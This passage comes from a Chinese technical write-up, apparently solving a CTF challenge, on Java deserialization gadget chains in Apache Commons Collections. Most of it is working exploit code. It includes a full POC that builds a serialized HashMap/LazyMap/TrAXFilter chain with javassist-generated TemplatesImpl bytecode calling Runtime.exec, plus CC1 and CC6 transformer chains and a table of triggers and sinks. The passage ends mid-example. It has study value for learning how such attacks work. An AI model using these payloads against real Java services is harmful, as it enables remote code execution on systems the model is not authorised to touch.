    <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">&quot;exec&quot;</span><span class="token punctuation">,</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span>          <span class="token comment">// 执行命令</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>

<span class="token comment">// 使用 HashMap + TiedMapEntry + LazyMap 触发</span>
<span class="token class-name">HashMap</span> hashMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">TiedMapEntry</span> entry <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TiedMapEntry</span><span class="token punctuation">(</span>lazyMap<span class="token punctuation">,</span> <span class="token string">&quot;key&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
hashMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>entry<span class="token punctuation">,</span> <span class="token string">&quot;value&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre><h4 id="调用链-2" tabindex="-1"><a class="header-anchor" href="#调用链-2"><span>调用链</span></a></h4><pre><code>HashMap.readObject()
  → hash(key)
    → TiedMapEntry.hashCode()
      → getValue()
        → LazyMap.get(key)
          → ChainedTransformer.transform()
            → InvokerTransformer链式调用 → Runtime.exec() → RCE
</code></pre><h4 id="cc-3-2-2失败原因-1" tabindex="-1"><a class="header-anchor" href="#cc-3-2-2失败原因-1"><span>CC 3.2.2失败原因</span></a></h4><pre><code class="language-java"><span class="token comment">// InvokerTransformer.readObject()</span>
<span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">readObject</span><span class="token punctuation">(</span><span class="token class-name">ObjectInputStream</span> is<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token class-name">FunctorUtils</span><span class="token punctuation">.</span><span class="token function">checkUnsafeSerialization</span><span class="token punctuation">(</span><span class="token class-name">InvokerTransformer</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// ❌ 抛异常</span>
<span class="token punctuation">}</span>
</code></pre><hr><h3 id="cc1-cc3-cc6核心区别对比表" tabindex="-1"><a class="header-anchor" href="#cc1-cc3-cc6核心区别对比表"><span>CC1/CC3/CC6核心区别对比表</span></a></h3><table><thead><tr><th>特性</th><th>CC1</th><th>CC3</th><th>CC6</th></tr></thead><tbody><tr><td><strong>Commons Collections版本</strong></td><td>≤3.2.1</td><td>≤3.2.1</td><td>≤3.2.1</td></tr><tr><td><strong>JDK版本限制</strong></td><td>≤JDK 8u71</td><td>8u71+可用（部分版本）</td><td>无限制</td></tr><tr><td><strong>触发类</strong></td><td>AnnotationInvocationHandler</td><td>AnnotationInvocationHandler</td><td>HashMap</td></tr><tr><td><strong>触发方式</strong></td><td>TransformedMap.setValue()</td><td>动态代理 + LazyMap.get()</td><td>TiedMapEntry.hashCode() → LazyMap.get()</td></tr><tr><td><strong>核心Transformer</strong></td><td>InvokerTransformer</td><td>InstantiateTransformer</td><td>InvokerTransformer</td></tr><tr><td><strong>攻击目标</strong></td><td>Runtime.exec()</td><td>TrAXFilter → TemplatesImpl</td><td>Runtime.exec()</td></tr><tr><td><strong>优点</strong></td><td>简单直接</td><td>绕过JDK 8u71限制，字节码加载隐蔽</td><td>JDK兼容性最好</td></tr><tr><td><strong>缺点</strong></td><td>JDK 8u71+失效</td><td>高版本JDK可能失效</td><td>直接调用Runtime易被拦截</td></tr><tr><td><strong>失效原因</strong></td><td>memberValues类型检查</td><td>InstantiateTransformer被禁用</td><td>InvokerTransformer被禁用</td></tr></tbody></table><p><strong>关键发现</strong>：</p><ul><li>CC1 → CC3：为了绕过JDK 8u71+对TransformedMap的限制，改用动态代理触发LazyMap</li><li>CC3 → CC6：为了彻底摆脱AnnotationInvocationHandler的JDK版本限制，改用HashMap触发</li></ul><hr><h2 id="解题思路" tabindex="-1"><a class="header-anchor" href="#解题思路"><span>解题思路</span></a></h2><h3 id="核心思路" tabindex="-1"><a class="header-anchor" href="#核心思路"><span>核心思路</span></a></h3><p>使用 <code>Myexpect</code> 替代被禁用的 <code>InstantiateTransformer</code>，利用 Hutool JSONObject 的 JSON 序列化机制自动触发 getter 方法。</p><h3 id="技术选型" tabindex="-1"><a class="header-anchor" href="#技术选型"><span>技术选型</span></a></h3><table><thead><tr><th>组件</th><th>选择</th><th>原因</th></tr></thead><tbody><tr><td>触发方式</td><td>CC6 (HashMap + TiedMapEntry + LazyMap)</td><td>JDK通用，触发稳定</td></tr><tr><td>攻击目标</td><td>CC3 (TrAXFilter + TemplatesImpl)</td><td>构造器触发，适配Myexpect</td></tr><tr><td>绕过手段</td><td>ConstantTransformer + JSONObject</td><td>返回Myexpect对象，JSON序列化触发getter</td></tr></tbody></table><h3 id="完整利用链" tabindex="-1"><a class="header-anchor" href="#完整利用链"><span>完整利用链</span></a></h3><pre><code>HashMap.readObject()
  → TiedMapEntry.hashCode()
    → LazyMap.get(key)
      → ConstantTransformer.transform()  // 返回Myexpect对象
        → JSONObject.put(key, myexpect)  // JSON序列化触发
          → Myexpect.getAnyexcept()      // 反射调用构造器
            → new TrAXFilter(templates)
              → TemplatesImpl.newTransformer()
                → 加载恶意字节码 → RCE ✅
</code></pre><hr><h2 id="完整poc实现" tabindex="-1"><a class="header-anchor" href="#完整poc实现"><span>完整POC实现</span></a></h2><pre><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MyPOC</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">{</span>
        <span class="token comment">// 准备TemplatesImpl字节码</span>
        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bytes <span class="token operator">=</span> <span class="token function">getTemplates</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">TemplatesImpl</span> templates <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TemplatesImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span> <span class="token string">&quot;_name&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;1&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span> <span class="token string">&quot;_bytecodes&quot;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>bytes<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        
        <span class="token comment">// 配置Myexpect调用TrAXFilter构造器</span>
        <span class="token class-name">Myexpect</span> myexpect <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Myexpect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        myexpect<span class="token punctuation">.</span><span class="token function">setTargetclass</span><span class="token punctuation">(</span><span class="token class-name">TrAXFilter</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        myexpect<span class="token punctuation">.</span><span class="token function">setTypeparam</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token class-name">Templates</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        myexpect<span class="token punctuation">.</span><span class="token function">setTypearg</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>templates<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        
        <span class="token comment">// 构造LazyMap触发链</span>
        <span class="token class-name">JSONObject</span> jsonObject <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">JSONObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">ConstantTransformer</span> transformer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">LazyMap</span> lazyMap <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">LazyMap</span><span class="token punctuation">)</span> <span class="token class-name">LazyMap</span><span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>jsonObject<span class="token punctuation">,</span> transformer<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">TiedMapEntry</span> tiedMapEntry <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TiedMapEntry</span><span class="token punctuation">(</span>lazyMap<span class="token punctuation">,</span> <span class="token string">&quot;111&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        
        <span class="token comment">// HashMap触发 + 时序控制</span>
        <span class="token class-name">HashMap</span> hashMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        hashMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>tiedMapEntry<span class="token punctuation">,</span> <span class="token string">&quot;1&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        jsonObject<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span><span class="token string">&quot;111&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 确保反序列化时触发</span>
        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>transformer<span class="token punctuation">,</span> <span class="token string">&quot;iConstant&quot;</span><span class="token punctuation">,</span> myexpect<span class="token punctuation">)</span><span class="token punctuation">;</span>
        
        <span class="token comment">// 生成payload</span>
        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> serialize <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span>hashMap<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">Base64</span><span class="token punctuation">.</span><span class="token function">getEncoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">encodeToString</span><span class="token punctuation">(</span>serialize<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">getTemplates</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">{</span>
        <span class="token class-name">ClassPool</span> pool <span class="token operator">=</span> <span class="token class-name">ClassPool</span><span class="token punctuation">.</span><span class="token function">getDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">CtClass</span> template <span class="token operator">=</span> pool<span class="token punctuation">.</span><span class="token function">makeClass</span><span class="token punctuation">(</span><span class="token string">&quot;Test&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        template<span class="token punctuation">.</span><span class="token function">setSuperclass</span><span class="token punctuation">(</span>pool<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">String</span> block <span class="token operator">=</span> <span class="token string">&quot;Runtime.getRuntime().exec(\\&quot;calc\\&quot;);&quot;</span><span class="token punctuation">;</span>
        template<span class="token punctuation">.</span><span class="token function">makeClassInitializer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">insertBefore</span><span class="token punctuation">(</span>block<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> template<span class="token punctuation">.</span><span class="token function">toBytecode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre><hr><h2 id="关键机制解析" tabindex="-1"><a class="header-anchor" href="#关键机制解析"><span>关键机制解析</span></a></h2><h3 id="_1-jsonobject-put-触发-getanyexcept" tabindex="-1"><a class="header-anchor" href="#_1-jsonobject-put-触发-getanyexcept"><span>1. JSONObject.put 触发 getAnyexcept()</span></a></h3><p><strong>核心原理</strong>：Hutool JSONObject.put() 会调用 BeanUtil.beanToMap()，自动反射调用对象的所有getter方法。</p><pre><code class="language-java"><span class="token class-name">LazyMap</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">&quot;111&quot;</span><span class="token punctuation">)</span>
  → transformer<span class="token punctuation">.</span><span class="token function">transform</span><span class="token punctuation">(</span><span class="token string">&quot;111&quot;</span><span class="token punctuation">)</span>  <span class="token comment">// 返回Myexpect对象</span>
    → jsonObject<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">&quot;111&quot;</span><span class="token punctuation">,</span> myexpect<span class="token punctuation">)</span>  <span class="token comment">// JSONObject序列化</span>
      → <span class="token function">getAnyexcept</span><span class="token punctuation">(</span><span class="token punctuation">)</span> 被自动调用！
</code></pre><p><strong>关键</strong>：使用JSONObject而非普通HashMap作为LazyMap底层Map。</p><h3 id="_2-jsonobject-remove-111-的作用" tabindex="-1"><a class="header-anchor" href="#_2-jsonobject-remove-111-的作用"><span>2. jsonObject.remove(&quot;111&quot;) 的作用</span></a></h3><p>确保反序列化时触发transform：</p><ul><li>构造时：<code>hashMap.put()</code> → <code>jsonObject.put(&quot;111&quot;, 1)</code></li><li>清理：<code>jsonObject.remove(&quot;111&quot;)</code></li><li>反序列化：<code>lazyMap.get(&quot;111&quot;)</code> → <code>!containsKey(&quot;111&quot;)</code> → 调用<code>transform()</code></li></ul><p><strong>不remove则</strong>：LazyMap直接返回已存在值，不触发transform。</p><h3 id="_3-为什么选择-traxfilter-templatesimpl" tabindex="-1"><a class="header-anchor" href="#_3-为什么选择-traxfilter-templatesimpl"><span>3. 为什么选择 TrAXFilter + TemplatesImpl</span></a></h3><p><strong>Myexpect限制</strong>：只能调用构造器，不能调用普通方法。</p><p><strong>TrAXFilter优势</strong>：</p><pre><code class="language-java"><span class="token keyword">public</span> <span class="token class-name">TrAXFilter</span><span class="token punctuation">(</span><span class="token class-name">Templates</span> templates<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    _transformer <span class="token operator">=</span> templates<span class="token punctuation">.</span><span class="token function">newTransformer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 构造器中自动触发</span>
<span class="token punctuation">}</span>
</code></pre><ul><li>Runtime构造器是private的 ❌</li><li>TrAXFilter构造器是public的，且内部自动调用newTransformer() ✅</li></ul><hr><h2 id="反序列化链拼接原理" tabindex="-1"><a class="header-anchor" href="#反序列化链拼接原理"><span>反序列化链拼接原理</span></a></h2><h3 id="链的基本结构" tabindex="-1"><a class="header-anchor" href="#链的基本结构"><span>链的基本结构</span></a></h3><p>任何反序列化攻击链都可以分解为三个独立模块：</p><pre><code>[触发器 Trigger] → [传递机制 Chain] → [攻击目标 Sink]
       ↓                 ↓                  ↓
    入口点          Transformer          危险操作
</code></pre><h3 id="常见组件分类" tabindex="-1"><a class="header-anchor" href="#常见组件分类"><span>常见组件分类</span></a></h3><h4 id="_1-触发器-trigger-决定何时执行" tabindex="-1"><a class="header-anchor" href="#_1-触发器-trigger-决定何时执行"><span>1. 触发器（Trigger）- 决定何时执行</span></a></h4><p>| 触发器 | 入口方法 | JDK要求 | |--------|---------|---------|--------| | <strong>HashMap</strong> | readObject() → hash() → hashCode() | 任意版本 | | <strong>PriorityQueue</strong> | readObject() → heapify() → compare() | 任意版本 | | <strong>BadAttributeValueExpException</strong> | readObject() → toString() | 任意版本 | | <strong>AnnotationInvocationHandler</strong> | readObject() → entrySet() → setValue() | ≤JDK 8u71 |</p><h4 id="_2-传递机制-chain-如何传递到目标" tabindex="-1"><a class="header-anchor" href="#_2-传递机制-chain-如何传递到目标"><span>2. 传递机制（Chain）- 如何传递到目标</span></a></h4><table><thead><tr><th>传递机制</th><th>特点</th><th>CC版本要求</th></tr></thead><tbody><tr><td><strong>LazyMap</strong></td><td>延迟加载，访问不存在的key触发</td><td>任意版本</td></tr><tr><td><strong>TransformedMap</strong></td><td>修改value时触发</td><td>任意版本</td></tr><tr><td><strong>ChainedTransformer</strong></td><td>链式调用多个Transformer</td><td>任意版本</td></tr><tr><td><strong>InvokerTransformer</strong></td><td>反射调用方法</td><td>≤3.2.1</td></tr><tr><td><strong>InstantiateTransformer</strong></td><td>反射调用构造器</td><td>≤3.2.1</td></tr><tr><td><strong>ConstantTransformer</strong></td><td>返回常量</td><td>任意版本</td></tr></tbody></table><h4 id="_3-攻击目标-sink-最终执行什么" tabindex="-1"><a class="header-anchor" href="#_3-攻击目标-sink-最终执行什么"><span>3. 攻击目标（Sink）- 最终执行什么</span></a></h4><table><thead><tr><th>攻击目标</th><th>触发方式</th><th>特点</th></tr></thead><tbody><tr><td><strong>Runtime.exec()</strong></td><td>方法调用</td><td>直接但容易被拦截</td></tr><tr><td><strong>TemplatesImpl字节码</strong></td><td>构造器或方法触发</td><td>隐蔽，绕过SecurityManager</td></tr><tr><td><strong>URLClassLoader</strong></td><td>加载远程类</td><td>需要网络访问</td></tr><tr><td><strong>JNDI注入</strong></td><td>lookup()调用</td><td>强大但有JDK版本限制</td></tr></tbody></table><hr><h3 id="拼接三原则" tabindex="-1"><a class="header-anchor" href="#拼接三原则"><span>拼接三原则</span></a></h3><h4 id="原则1-接口匹配" tabindex="-1"><a class="header-anchor" href="#原则1-接口匹配"><span>原则1：接口匹配</span></a></h4><p>触发器必须能调用传递机制的入口方法</p><pre><code class="language-java"><span class="token comment">// ✅ 正确：HashMap.hash() 调用 TiedMapEntry.hashCode()</span>
<span class="token class-name">HashMap</span> → <span class="token class-name">TiedMapEntry</span><span class="token punctuation">.</span><span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span> → <span class="token class-name">LazyMap</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token comment">// ❌ 错误：HashMap不会调用toString()</span>
<span class="token class-name">HashMap</span> → <span class="token class-name">BadAttributeValueExpException</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment">// 不匹配！</span>
</code></pre><h4 id="原则2-参数兼容" tabindex="-1"><a class="header-anchor" href="#原则2-参数兼容"><span>原则2：参数兼容</span></a></h4><p>上一步的输出必须是下一步的输入</p><pre><code class="language-java"><span class="token comment">// ✅ 正确：transform()接受Object返回Object，可以链式调用</span>
<span class="token class-name">ConstantTransformer</span><span class="token punctuation">.</span><span class="token function">transform</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  → 返回 <span class="token class-name">TrAXFilter</span><span class="token punctuation">.</span><span class="token keyword">class</span> <span class="token punctuation">(</span><span class="token class-name">Object</span><span class="token punctuation">)</span>
  ↓
<span class="token class-name">InstantiateTransformer</span><span class="token punctuation">.</span><span class="token function">transform</span><span class="token punctuation">(</span><span class="token class-name">Object</span><span class="token punctuation">)</span>  → 接受 <span class="token class-name">Class</span> 对象

<span class="token comment">// ❌ 错误：类型不匹配</span>
<span class="token class-name">ConstantTransformer</span> → 返回<span class="token class-name">String</span>
  ↓
<span class="token class-name">InstantiateTransformer</span> → 需要<span class="token class-name">Class</span>对象  <span class="token comment">// 类型不匹配！</span>
</code></pre><h4 id="原则3-版本限制" tabindex="-1"><a class="header-anchor" href="#原则3-版本限制"><span>原则3：版本限制</span></a></h4><p>检查每个组件的可用性</p><pre><code class="language-java"><span class="token comment">// CC 3.2.2 环境</span>
✅ <span class="token class-name">LazyMap</span>、<span class="token class-name">ConstantTransformer</span>、<span class="token class-name">HashMap</span>  <span class="token comment">// 可用</span>
❌ <span class="token class-name">InvokerTransformer</span>、<span class="token class-name">InstantiateTransformer</span>  <span class="token comment">// 被禁用</span>
</code></pre><hr><h3 id="经典组合示例" tabindex="-1"><a class="header-anchor" href="#经典组合示例"><span>经典组合示例</span></a></h3><h4 id="组合1-cc6-hashmap触发-invokertransformer链-runtime-exec" tabindex="-1"><a class="header-anchor" href="#组合1-cc6-hashmap触发-invokertransformer链-runtime-exec"><span>组合1：CC6 = HashMap触发 + InvokerTransformer链 + Runtime.exec()</span></a></h4><pre><code class="language-java"><span class="token comment">// [触发器] HashMap</span>
<span class="token class-name">HashMap</span> hashMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">TiedMapEntry</span> entry <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TiedMapEntry</span><span class="token punctuation">(</span>lazyMap<span class="token punctuation">,</span> <span class="token string">&quot;key&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
hashMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>entry<span class="token punctuation">,</span> <span class="token string">&quot;value&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// [传递机制] LazyMap + InvokerTransformer链</span>
<span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> transformers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>
    <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">&quot;getMethod&quot;</span><span class="token punctuation">,</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">&quot;invoke&quot;</span><span class="token punctuation">,</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">&quot;exec&quot;</span><span class="token punctuation">,</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token class-name">LazyMap</span> lazyMap <span class="token operator">=</span> <span class="token class-name">LazyMap</span><span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span>transformers<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// [攻击目标] Runtime.exec()</span>
<span class="token comment">// 调用链：</span>
<span class="token comment">// HashMap.readObject() → TiedMapEntry.hashCode() → LazyMap.get() </span>
<span class="token comment">// → ChainedTransformer → Runtime.exec()</span>
</code></pre><h4 id="组合2-cc1-transformedmap触发-invokertransformer-runtime-exec" tabindex="-1"><a class="header-anchor" href="#组合2-cc1-transformedmap触发-invokertransformer-runtime-exec"><span>组合2：CC1 = TransformedMap触发 + InvokerTransformer + Runtime.exec()</span></a></h4><pre><code class="language-java"><span class="token comment">// [触发器] AnnotationInvocationHandler + TransformedMap</span>
<span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">&gt;</span></span> innerMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
innerMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">&quot;value&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;test&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">Map</span> transformedMap <span class="token operator">=</span> <span class="token class-name">TransformedMap</span><span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>innerMap<span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> chainedTransformer<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// [传递机制] InvokerTransformer</span>
<span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> transformers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>
    <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">&quot;getMethod&quot;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">&quot;getRuntime&quot;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">&quot;invoke&quot;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">&quot;exec&quot;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">&quot;calc&quot;</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>

<span class="token comment">// [攻击目标] Runtime.exec()</span>
<span class="token comment">// 调用链：</span>
<span class="token comment">// AnnotationInvocationHandler.readObject() → TransformedMap.setValue()</span>
<span class="token comment">// → ChainedTransformer → InvokerTransformer链</span>
<span class="token comment">// → Runtime.getRuntime().exec() → RCE</span>
</code></pre><h4 id="组合3-cc3-动态代理触发-instantiatetransformer-templatesimpl" tabindex="-1"><a class="header-anchor" href="#组合3-cc3-动态代理触发-instantiatetransformer-templatesimpl"><span>组合3：CC3 = 动态代理触发 + InstantiateTransformer + TemplatesImpl</span></a></h4><pre><code class="language-java"><span class="token comment">// [触发器] AnnotationInvocationHandler + 动态代理 + LazyMap</span>
<span class="token class-name">Map</span> innerMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
